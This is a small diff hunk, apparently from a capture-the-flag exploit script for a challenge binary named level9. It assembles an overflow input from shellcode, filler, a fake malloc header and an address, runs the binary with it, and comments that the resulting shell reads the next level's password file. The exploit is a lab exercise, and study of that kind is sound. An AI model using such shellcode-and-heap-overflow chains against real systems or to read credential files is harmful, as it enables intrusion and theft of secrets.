@@ -42,4 +42,4 @@ INPUT="${SHELLCODE}${ASTR_FILLER}${AVAL_FILLER}${MALLOC_HEADER}${BADD}"
 ./level9 "${INPUT}"
 
 # We use the reverse shell to retrieve the password
-$ cat /home/user/bonus0/.pass
+# $> cat /home/user/bonus0/.pass
